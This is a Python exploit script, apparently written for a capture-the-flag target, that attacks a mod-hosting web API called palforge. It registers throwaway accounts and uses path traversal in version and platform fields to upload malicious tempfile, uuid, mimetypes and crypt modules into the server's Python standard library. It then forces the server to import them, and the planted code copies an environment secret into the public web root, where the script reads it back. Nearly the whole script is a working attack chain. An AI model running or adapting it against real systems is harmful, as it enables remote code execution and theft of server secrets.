import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = pf.BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u

def plant(tok, ver, code, filename, data):
    pid = pf.create_platform(tok, code, name="z")
    mid = pf.create_mod(tok, ver, title="z")
    bid = pf.create_build(tok, mid, pid)
    return pf.upload_zip(tok, mid, bid, {filename: data})

results={}
for mod, mk in [("tempfile","m_temp"),("uuid","m_uuid"),("mimetypes","m_mime"),("crypt","m_crypt")]:
    tok,u = fresh()
    mal=f'import os\nopen("/usr/share/nginx/html/{mk}","w").write(os.environ.get("FLAG","NOFLAG"))\n'.encode()
    st=plant(tok,"../../../usr/local","lib/python3.11",mod+".py",mal)
    results[mod]=st
    # trigger large upload (TemporaryFileUploadHandler -> tempfile/uuid) and media serve (mimetypes)
    pid = pf.create_platform(tok, "t%d"%random.randint(0,9999), name="z")
    mid = pf.create_mod(tok, "v%d"%random.randint(0,9999), title="z")
    bid = pf.create_build(tok, mid, pid)
    bio=io.BytesIO()
    with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as zf: zf.writestr("big.bin", b"A"*(4*1024*1024))
    bio.seek(0)
    requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers={"Authorization":f"Bearer {tok}"}, files={"zip_file":("p.zip",bio,"application/zip")}, timeout=30)
    requests.get(f"{BASE}/media/builds/4.0.0/steam_win/nonexist", timeout=8)
    time.sleep(1)
print("plant statuses:", results)
time.sleep(1)
for mk in ["m_temp","m_uuid","m_mime","m_crypt"]:
    try:
        c=requests.get(f"{BASE}/{mk}",timeout=8)
        print(mk,"status",c.status_code,"body",repr(c.content[:80]))
    except Exception as e:
        print(mk,"err",e)
